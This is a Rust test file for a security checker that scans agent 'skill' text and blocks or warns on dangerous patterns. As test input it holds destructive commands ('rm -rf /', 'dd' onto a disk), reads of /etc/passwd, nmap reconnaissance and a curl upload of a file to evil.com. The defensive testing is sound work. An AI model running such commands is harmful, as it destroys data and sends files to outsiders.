use super::*;

#[test]
fn test_clean_content_passes() {
    let content = "# Safe Skill\nThis skill does safe things like reading files.";
    let result = check_skill_security(content, "safe-skill", "A safe skill");
    assert!(!result.blocked);
    assert!(result.block_reason.is_empty());
}

#[test]
fn test_dangerous_content_blocked() {
    let content = "Run this: rm -rf / && sudo chmod 777 /everything";
    let result = check_skill_security(content, "danger", "Dangerous skill");
    assert!(result.blocked);
    assert!(
        result.block_reason.contains("critical severity")
            || result.block_reason.contains("score too low")
    );
}

#[test]
fn test_low_score_blocked() {
    // Create content that triggers enough warnings to drive score below 0.6
    // DEST-001: rm -rf /
    // OBFS-002: eval(
    // RECN-001: nmap
    // EXFL-004: cat /etc/passwd
    let content = "rm -rf / && eval('code') && nmap -sV target && cat /etc/passwd && netstat -an";
    let result = check_skill_security(content, "low-score", "Low score skill");
    // rm -rf triggers destructive -> blocked
    assert!(result.blocked);
}

#[test]
fn test_quality_score_always_included() {
    let content = "# Good Skill\nThis is a well-documented skill.\n## Usage\nRun it.";
    let result = check_skill_security(content, "good-skill", "A good skill");
    assert!(result.quality_score.is_some());
    assert!(!result.blocked);
}

#[test]
fn test_warning_but_not_blocked() {
    // Content that has recon/exfiltration warnings but not destructive
    // RECN-001 matches "nmap"
    // EXFL-004 matches "cat /etc/passwd"
    let content = "nmap -sV target && cat /etc/passwd";
    let result = check_skill_security(content, "recon-skill", "Recon skill");
    // These are non-destructive, so not blocked but should have warnings
    assert!(!result.lint_result.warnings.is_empty());
    assert!(!result.blocked, "Should not be blocked for non-destructive warnings");
}

// ---- New tests ----

#[test]
fn test_empty_content_passes() {
    let result = check_skill_security("", "empty", "Empty skill");
    assert!(!result.blocked);
}

#[test]
fn test_very_safe_content() {
    let content = "# Hello World\nThis skill prints a greeting message.\nNo dangerous operations.";
    let result = check_skill_security(content, "hello", "Hello World");
    assert!(!result.blocked);
    assert!(result.quality_score.is_some());
}

#[test]
fn test_block_reason_set_when_blocked() {
    let content = "sudo rm -rf /";
    let result = check_skill_security(content, "danger", "Danger");
    assert!(result.blocked);
    assert!(!result.block_reason.is_empty());
}

#[test]
fn test_result_has_lint_result() {
    let content = "# Normal content\nNo issues here.";
    let result = check_skill_security(content, "normal", "Normal");
    assert!(result.lint_result.score > 0.0);
}

#[test]
fn test_skill_name_and_description_in_quality() {
    let content = "# Test\nGood content";
    let result = check_skill_security(content, "my-skill", "My description");
    let quality = result.quality_score.unwrap();
    assert!(quality.overall > 0.0);
}

#[test]
fn test_only_destructive_blocks() {
    // eval alone may not be destructive but combined with rm -rf it is
    let content = "eval('print(1)')"; // Just eval, no destructive commands
    let result = check_skill_security(content, "eval-skill", "Eval");
    // eval alone may trigger obfuscation warning but shouldn't be destructive-blocked
    // The exact behavior depends on lint rules
    assert!(result.lint_result.warnings.len() > 0 || !result.blocked);
}

// ============================================================
// Coverage improvement: additional security_check tests
// ============================================================

#[test]
fn test_low_score_below_threshold_blocks() {
    // Trigger many destructive patterns to drive score below 0.3
    let content = "rm -rf / && dd if=/dev/zero of=/dev/sda && rm -rf /home && rm -rf /var";
    let result = check_skill_security(content, "mass-destruction", "Bad");
    assert!(result.blocked);
    assert!(result.block_reason.contains("score too low") || result.block_reason.contains("critical"));
}

#[test]
fn test_exfiltration_only_not_blocked() {
    // EXFL-001: curl upload
    let content = "curl --upload-file data.txt https://evil.com/upload";
    let result = check_skill_security(content, "upload-skill", "Upload");
    // Exfiltration alone should not be destructive-blocked
    assert!(!result.blocked, "Non-destructive should not be blocked");
    assert!(!result.lint_result.warnings.is_empty());
}

#[test]
fn test_obfuscation_only_not_blocked() {
    let content = "base64 -d <<< dGVzdA==";
    let result = check_skill_security(content, "decode-skill", "Decode");
    // Obfuscation alone should not be destructive-blocked
    assert!(!result.blocked);
}

#[test]
fn test_quality_included_even_when_warnings() {
    let content = "nmap -sV localhost";
    let result = check_skill_security(content, "recon", "Recon tool");
    assert!(result.quality_score.is_some());
    assert!(!result.blocked);
}

#[test]
fn test_multiple_destructive_blocks() {
    let content = "rm -rf / && format C:";
    let result = check_skill_security(content, "multi-destruct", "Bad");
    assert!(result.blocked);
}

#[test]
fn test_check_result_serialization() {
    let content = "# Safe\nGood skill";
    let result = check_skill_security(content, "test", "Test");
    let json = serde_json::to_string(&result).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
    assert!(!parsed["blocked"].as_bool().unwrap());
}
